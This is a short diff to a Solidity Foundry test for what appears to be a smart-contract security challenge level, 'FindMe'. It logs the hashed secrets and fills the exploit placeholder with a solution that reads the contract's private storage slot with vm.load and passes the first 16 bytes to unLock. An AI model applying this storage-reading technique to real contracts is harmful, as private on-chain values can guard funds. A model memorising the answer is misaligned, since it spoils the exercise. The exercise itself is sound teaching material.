@@ -14,14 +14,17 @@ contract FindMeTest is BaseTest {
         uint16 setImmutable = uint16(uint160(tx.origin));
         bytes32[3] memory data;
         data[0] = keccak256(abi.encodePacked(tx.origin, "0"));
+        console.logBytes32(data[0]);
         data[1] = keccak256(abi.encodePacked(tx.origin, "1"));
+        console.logBytes32(data[1]);
         data[2] = keccak256(abi.encodePacked(tx.origin, "2"));
+        console.logBytes32(data[2]);
         instance = new FindMe(setImmutable, data);
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
-
+        bytes32 data = vm.load(address(instance), bytes32(uint256(4)));
+        instance.unLock(bytes16(data));
         checkSuccess();
     }
 
